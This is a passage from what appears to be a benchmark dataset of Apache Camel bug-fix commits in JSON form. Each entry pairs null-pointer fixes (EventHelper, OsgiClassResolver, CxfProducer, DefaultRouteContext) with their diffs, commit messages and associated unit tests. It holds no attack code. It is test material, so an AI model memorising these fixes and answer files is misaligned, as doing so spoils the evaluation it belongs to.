notifyCamelContextStopped(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -145,7 +171,7 @@ public static void notifyCamelContextStopped(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -158,7 +184,12 @@ public static void notifyCamelContextStopped(CamelContext context) {\n     }\n \n     public static void notifyCamelContextStopFailed(CamelContext context, Throwable cause) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -168,7 +199,7 @@ public static void notifyCamelContextStopFailed(CamelContext context, Throwable\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -181,7 +212,12 @@ public static void notifyCamelContextStopFailed(CamelContext context, Throwable\n     }\n \n     public static void notifyServiceStopFailure(CamelContext context, Object service, Throwable cause) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -191,7 +227,7 @@ public static void notifyServiceStopFailure(CamelContext context, Object service\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -204,7 +240,12 @@ public static void notifyServiceStopFailure(CamelContext context, Object service\n     }\n \n     public static void notifyServiceStartupFailure(CamelContext context, Object service, Throwable cause) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -214,7 +255,7 @@ public static void notifyServiceStartupFailure(CamelContext context, Object serv\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -227,7 +268,12 @@ public static void notifyServiceStartupFailure(CamelContext context, Object serv\n     }\n \n     public static void notifyRouteStarted(CamelContext context, Route route) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -237,7 +283,7 @@ public static void notifyRouteStarted(CamelContext context, Route route) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -250,7 +296,12 @@ public static void notifyRouteStarted(CamelContext context, Route route) {\n     }\n \n     public static void notifyRouteStopped(CamelContext context, Route route) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -260,7 +311,7 @@ public static void notifyRouteStopped(CamelContext context, Route route) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -278,7 +329,12 @@ public static void notifyExchangeCreated(CamelContext context, Exchange exchange\n             return;\n         }\n \n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -288,7 +344,7 @@ public static void notifyExchangeCreated(CamelContext context, Exchange exchange\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -306,7 +362,12 @@ public static void notifyExchangeDone(CamelContext context, Exchange exchange) {\n             return;\n         }\n \n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -316,7 +377,7 @@ public static void notifyExchangeDone(CamelContext context, Exchange exchange) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -334,7 +395,12 @@ public static void notifyExchangeFailed(CamelContext context, Exchange exchange)\n             return;\n         }\n \n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -344,7 +410,7 @@ public static void notifyExchangeFailed(CamelContext context, Exchange exchange)\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -363,7 +429,12 @@ public static void notifyExchangeFailureHandled(CamelContext context, Exchange e\n             return;\n         }\n \n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -373,7 +444,7 @@ public static void notifyExchangeFailureHandled(CamelContext context, Exchange e\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -391,7 +462,12 @@ public static void notifyExchangeRedelivery(CamelContext context, Exchange excha\n             return;\n         }\n \n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -401,7 +477,7 @@ public static void notifyExchangeRedelivery(CamelContext context, Exchange excha\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -419,7 +495,12 @@ public static void notifyExchangeSending(CamelContext context, Exchange exchange\n             return;\n         }\n \n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -429,7 +510,7 @@ public static void notifyExchangeSending(CamelContext context, Exchange exchange\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -447,7 +528,12 @@ public static void notifyExchangeSent(CamelContext context, Exchange exchange, E\n             return;\n         }\n \n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -457,7 +543,7 @@ public static void notifyExchangeSent(CamelContext context, Exchange exchange, E\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -470,7 +556,12 @@ public static void notifyExchangeSent(CamelContext context, Exchange exchange, E\n     }\n \n     public static void notifyCamelContextSuspending(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -480,7 +571,7 @@ public static void notifyCamelContextSuspending(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -493,7 +584,12 @@ public static void notifyCamelContextSuspending(CamelContext context) {\n     }\n \n     public static void notifyCamelContextSuspended(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -503,7 +599,7 @@ public static void notifyCamelContextSuspended(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -516,7 +612,12 @@ public static void notifyCamelContextSuspended(CamelContext context) {\n     }\n \n     public static void notifyCamelContextResuming(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -526,7 +627,7 @@ public static void notifyCamelContextResuming(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -539,7 +640,12 @@ public static void notifyCamelContextResuming(CamelContext context) {\n     }\n \n     public static void notifyCamelContextResumed(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -549,7 +655,7 @@ public static void notifyCamelContextResumed(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -562,7 +668,12 @@ public static void notifyCamelContextResumed(CamelContext context) {\n     }\n \n     public static void notifyCamelContextResumeFailed(CamelContext context, Throwable cause) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -572,7 +683,7 @@ public static void notifyCamelContextResumeFailed(CamelContext context, Throwabl\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }",
                "raw_url": "https://github.com/apache/camel/raw/18f8d29f985746e5b5afa7f7b26564c5be564d5c/camel-core/src/main/java/org/apache/camel/util/EventHelper.java",
                "sha": "c5206afbcad3f5d7b7fc534982097ba4c3e30c40",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/131d39bc51051343ddeda277a433a84f21a4c825",
        "patched_files": [
            "EventHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "EventHelperTest.java"
        ]
    },
    "camel_1a43769": {
        "bug_id": "camel_1a43769",
        "commit": "https://github.com/apache/camel/commit/1a43769257f84fbb56ab9fbc04dfcb6ad778c83a",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/1a43769257f84fbb56ab9fbc04dfcb6ad778c83a/camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java?ref=1a43769257f84fbb56ab9fbc04dfcb6ad778c83a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java",
                "patch": "@@ -216,6 +216,15 @@ public void testOGNLBodyListAndMap() throws Exception {\n         assertExpression(\"${in.body[0][code]}\", 4321);\n         assertExpression(\"${body[0][code]}\", 4321);\n     }\n+    \n+    public void testOGNLCallReplace() throws Exception {\n+        Map<String, Object> map = new HashMap<String, Object>();\n+        map.put(\"cool\", \"Camel rocks\");\n+        map.put(\"dude\", \"Hey dude\");\n+        exchange.getIn().setHeaders(map);\n+        \n+        assertExpression(\"${headers.cool.replaceAll(\\\"rocks\\\", \\\"is so cool\\\")}\", \"Camel is so cool\");\n+    }\n \n     public void testOGNLBodyListAndMapAndMethod() throws Exception {\n         Map<String, Object> map = new HashMap<String, Object>();",
                "raw_url": "https://github.com/apache/camel/raw/1a43769257f84fbb56ab9fbc04dfcb6ad778c83a/camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java",
                "sha": "407f755094d1376ca73e20cc12107686ced7616a",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/1a43769257f84fbb56ab9fbc04dfcb6ad778c83a/camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java?ref=1a43769257f84fbb56ab9fbc04dfcb6ad778c83a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java",
                "patch": "@@ -832,6 +832,7 @@ public void testNormalizeClassName() {\n         assertEquals(\"Should get the right class name\", \"my.package-info\", ObjectHelper.normalizeClassName(\"my.package-info\"));\n         assertEquals(\"Should get the right class name\", \"Integer[]\", ObjectHelper.normalizeClassName(\"Integer[] \\r\"));\n         assertEquals(\"Should get the right class name\", \"Hello_World\", ObjectHelper.normalizeClassName(\"Hello_World\"));\n+        assertEquals(\"Should get the right class name\", \"\", ObjectHelper.normalizeClassName(\"////\"));\n     }\n \n     public void testLookupConstantFieldValue() {",
                "raw_url": "https://github.com/apache/camel/raw/1a43769257f84fbb56ab9fbc04dfcb6ad778c83a/camel-core/src/test/java/org/apache/camel/util/ObjectHelperTest.java",
                "sha": "3f2b1cd5abe8ea32da0c11fafec5c302b3e7ee50",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/1a43769257f84fbb56ab9fbc04dfcb6ad778c83a/components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiClassResolver.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiClassResolver.java?ref=1a43769257f84fbb56ab9fbc04dfcb6ad778c83a",
                "deletions": 0,
                "filename": "components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiClassResolver.java",
                "patch": "@@ -45,6 +45,10 @@ public OsgiClassResolver(BundleContext context) {\n     public Class<?> resolveClass(String name) {\n         LOG.trace(\"Resolve class {}\", name);\n         name = ObjectHelper.normalizeClassName(name);\n+        if (ObjectHelper.isEmpty(name)) {\n+            return null;\n+        }\n+        // we need to avoid the NPE issue of loading the class\n         Class<?> clazz = ObjectHelper.loadSimpleType(name);\n         if (clazz == null) {\n             clazz = doLoadClass(name, bundleContext.getBundle());",
                "raw_url": "https://github.com/apache/camel/raw/1a43769257f84fbb56ab9fbc04dfcb6ad778c83a/components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiClassResolver.java",
                "sha": "66c40085022c70348ad25aafd84f0f8767543c4b",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7262 fixed the NPE issue of calling String.replaceAll via simple expression in Karaf",
        "parent": "https://github.com/apache/camel/commit/1ad5655433d27a73bd0ab08f44b9c1aac69cb2fb",
        "patched_files": [
            "ObjectHelper.java",
            "OsgiClassResolver.java",
            "Simple.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SimpleTest.java",
            "ObjectHelperTest.java",
            "OsgiClassResolverTest.java"
        ]
    },
    "camel_1d15495": {
        "bug_id": "camel_1d15495",
        "commit": "https://github.com/apache/camel/commit/1d1549541d3489182b049d91638d56b57afd6c02",
        "file": [
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/1d1549541d3489182b049d91638d56b57afd6c02/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "changes": 18,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java?ref=1d1549541d3489182b049d91638d56b57afd6c02",
                "deletions": 10,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "patch": "@@ -30,6 +30,7 @@\n import org.apache.camel.AsyncCallback;\n import org.apache.camel.AsyncProcessor;\n import org.apache.camel.Exchange;\n+import org.apache.camel.InvalidPayloadException;\n import org.apache.camel.RuntimeCamelException;\n import org.apache.camel.impl.DefaultProducer;\n import org.apache.camel.util.ObjectHelper;\n@@ -213,7 +214,7 @@ private void checkParameterSize(CxfEndpoint endpoint, Exchange exchange, Object[\n         if (boi == null) {\n             throw new RuntimeCamelException(\"Can't find the binding operation information from camel exchange\");\n         }\n-        if (!endpoint.isWrapped() && boi != null) {\n+        if (!endpoint.isWrapped()) {\n             if (boi.isUnwrappedCapable()) {\n                 boi = boi.getUnwrappedOperation();\n             }\n@@ -253,7 +254,7 @@ private void checkParameterSize(CxfEndpoint endpoint, Exchange exchange, Object[\n     /**\n      * Get the parameters for the web service operation\n      */\n-    private Object[] getParams(CxfEndpoint endpoint, Exchange exchange) {\n+    private Object[] getParams(CxfEndpoint endpoint, Exchange exchange) throws InvalidPayloadException {\n       \n         Object[] params = null;\n         if (endpoint.getDataFormat() == DataFormat.POJO) {\n@@ -276,25 +277,22 @@ private void checkParameterSize(CxfEndpoint endpoint, Exchange exchange, Object[\n                     params[0] = exchange.getIn().getBody();\n                 }\n             }\n+            // make sure we have the right number of parameters\n             checkParameterSize(endpoint, exchange, params);\n-            \n+\n         } else if (endpoint.getDataFormat() == DataFormat.PAYLOAD) {\n             params = new Object[1];\n-            // TODO: maybe it should be mandatory body?\n-            params[0] = exchange.getIn().getBody(CxfPayload.class);\n+            params[0] = exchange.getIn().getMandatoryBody(CxfPayload.class);\n         } else if (endpoint.getDataFormat() == DataFormat.MESSAGE) {\n             params = new Object[1];\n-            // TODO: maybe it should be mandatory body?\n-            params[0] = exchange.getIn().getBody(InputStream.class);\n+            params[0] = exchange.getIn().getMandatoryBody(InputStream.class);\n         }\n \n         if (LOG.isTraceEnabled()) {\n-            if (params instanceof Object[]) {\n+            if (params != null) {\n                 for (int i = 0; i < params.length; i++) {\n                     LOG.trace(\"params[\" + i + \"] = \" + params[i]);\n                 }\n-            } else {\n-                LOG.trace(\"params = \" + params);\n             }\n         }\n         ",
                "raw_url": "https://github.com/apache/camel/raw/1d1549541d3489182b049d91638d56b57afd6c02/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "sha": "d6f7b20c42334e28012860859c07a1abc9f918ab",
                "status": "modified"
            }
        ],
        "message": "CAMEL-3151: CxfProducer uses mandatory body to ensure input message exists. This avoids NPE exceptions later on.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1003946 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/3cfb9d8846dd38a61d44b30f2b8782967a082f86",
        "patched_files": [
            "CxfProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfProducerTest.java"
        ]
    },
    "camel_1d6508e": {
        "bug_id": "camel_1d6508e",
        "commit": "https://github.com/apache/camel/commit/1d6508eadd7b8dc751e6d00bfd081d62578b2f16",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/1d6508eadd7b8dc751e6d00bfd081d62578b2f16/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java?ref=1d6508eadd7b8dc751e6d00bfd081d62578b2f16",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "patch": "@@ -28,6 +28,7 @@\n import org.apache.camel.NoSuchEndpointException;\n import org.apache.camel.Processor;\n import org.apache.camel.Route;\n+import org.apache.camel.RuntimeCamelException;\n import org.apache.camel.ShutdownRoute;\n import org.apache.camel.ShutdownRunningTask;\n import org.apache.camel.model.FromDefinition;\n@@ -123,6 +124,12 @@ public Endpoint resolveEndpoint(String uri, String ref) {\n             if (!this.getCamelContext().equals(endpoint.getCamelContext())) {\n                 throw new NoSuchEndpointException(\"ref:\" + ref, \"make sure the endpoint has the same camel context as the route does.\");\n             }\n+            try {\n+                // need add the endpoint into service\n+                getCamelContext().addService(endpoint);\n+            } catch (Exception ex) {\n+                throw new RuntimeCamelException(ex);\n+            }\n         }\n         if (endpoint == null) {\n             throw new IllegalArgumentException(\"Either 'uri' or 'ref' must be specified on: \" + this);",
                "raw_url": "https://github.com/apache/camel/raw/1d6508eadd7b8dc751e6d00bfd081d62578b2f16/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "sha": "39b6089abf7f9da32cba0e78dfcac03233368d12",
                "status": "modified"
            },
            {
                "additions": 48,
                "blob_url": "https://github.com/apache/camel/blob/1d6508eadd7b8dc751e6d00bfd081d62578b2f16/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CXFGreeterEnrichTest.java",
                "changes": 48,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CXFGreeterEnrichTest.java?ref=1d6508eadd7b8dc751e6d00bfd081d62578b2f16",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CXFGreeterEnrichTest.java",
                "patch": "@@ -0,0 +1,48 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.cxf;\n+\n+import javax.xml.ws.Endpoint;\n+\n+import org.apache.hello_world_soap_http.GreeterImpl;\n+import org.junit.AfterClass;\n+import org.junit.BeforeClass;\n+import org.springframework.context.support.ClassPathXmlApplicationContext;\n+\n+public class CXFGreeterEnrichTest extends AbstractCXFGreeterRouterTest {\n+    protected static Endpoint endpoint;\n+    @AfterClass\n+    public static void stopService() {\n+        if (endpoint != null) {\n+            endpoint.stop();\n+        }\n+    }\n+\n+\n+    @BeforeClass\n+    public static void startService() {\n+        Object implementor = new GreeterImpl();\n+        String address = \"http://localhost:\" + getPort1() + \"/CXFGreeterEnrichTest/SoapContext/SoapPort\"; \n+        endpoint = Endpoint.publish(address, implementor); \n+    }\n+\n+    protected ClassPathXmlApplicationContext createApplicationContext() {\n+        return new ClassPathXmlApplicationContext(\"org/apache/camel/component/cxf/GreeterEnrichRouterContext.xml\");\n+    }\n+\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/1d6508eadd7b8dc751e6d00bfd081d62578b2f16/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CXFGreeterEnrichTest.java",
                "sha": "da4c5646007fde60d557fb2604cc7b50a5f6d965",
                "status": "added"
            },
            {
                "additions": 61,
                "blob_url": "https://github.com/apache/camel/blob/1d6508eadd7b8dc751e6d00bfd081d62578b2f16/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEnrichRouterContext.xml",
                "changes": 61,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEnrichRouterContext.xml?ref=1d6508eadd7b8dc751e6d00bfd081d62578b2f16",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEnrichRouterContext.xml",
                "patch": "@@ -0,0 +1,61 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<beans xmlns=\"http://www.springframework.org/schema/beans\"\n+       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+       xmlns:cxf=\"http://camel.apache.org/schema/cxf\"\n+\n+       xsi:schemaLocation=\"\n+       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n+       http://camel.apache.org/schema/cxf http://camel.apache.org/schema/cxf/camel-cxf.xsd\n+       http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd\n+    \">\n+  \n+   <bean class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"/>\n+\n+   <!-- START SNIPPET: example -->\n+   <cxf:cxfEndpoint id=\"routerEndpoint\" address=\"http://localhost:${CXFTestSupport.port2}/CXFGreeterEnrichTest/CamelContext/RouterPort\"\n+    \t\tserviceClass=\"org.apache.hello_world_soap_http.GreeterImpl\"\n+    \t\tskipFaultLogging=\"true\">\n+        <cxf:outInterceptors>\n+            <!-- This interceptor will force the CXF server send the XML start document to client -->\n+            <bean class=\"org.apache.camel.component.cxf.WriteXmlDeclarationInterceptor\"/>\n+        </cxf:outInterceptors>\n+        <cxf:properties>\n+            <!-- Set the publishedEndpointUrl which could override the service address from generated WSDL as you want -->\n+    \t    <entry key=\"publishedEndpointUrl\" value=\"http://www.simple.com/services/test\" />\n+    \t</cxf:properties>\n+   </cxf:cxfEndpoint>\n+   <!-- END SNIPPET: example --> \t\t\n+\n+   <cxf:cxfEndpoint id=\"serviceEndpoint\" address=\"http://localhost:${CXFTestSupport.port1}/CXFGreeterEnrichTest/SoapContext/SoapPort\"\n+    \t\twsdlURL=\"testutils/hello_world.wsdl\"\n+    \t\tserviceClass=\"org.apache.hello_world_soap_http.Greeter\"\n+    \t\tendpointName=\"s:SoapPort\"\n+    \t\tserviceName=\"s:SOAPService\"\n+    \txmlns:s=\"http://apache.org/hello_world_soap_http\" />\n+\n+   <camelContext id=\"camel\" xmlns=\"http://camel.apache.org/schema/spring\">\n+    <route errorHandlerRef=\"noErrorHandler\">\n+      <from ref=\"routerEndpoint\" />\n+      <enrich ref=\"serviceEndpoint\" />\n+    </route>\n+   </camelContext>\n+\n+   <bean id=\"noErrorHandler\" class=\"org.apache.camel.builder.NoErrorHandlerBuilder\"/>\n+\n+</beans>\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/1d6508eadd7b8dc751e6d00bfd081d62578b2f16/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEnrichRouterContext.xml",
                "sha": "c6ff1c5b3e10d91fbfcb7cd9fc5be48e8bab38e7",
                "status": "added"
            }
        ],
        "message": "CAMEL-7867 Fixed the NPE when using CXF endpoint to enrich",
        "parent": "https://github.com/apache/camel/commit/bcc37d4272d87d5a3f912950d5d68a7625e8c03c",
        "patched_files": [
            "GreeterEnrichRouterContext.java",
            "DefaultRouteContext.java"
        ],
        "repo": "camel",
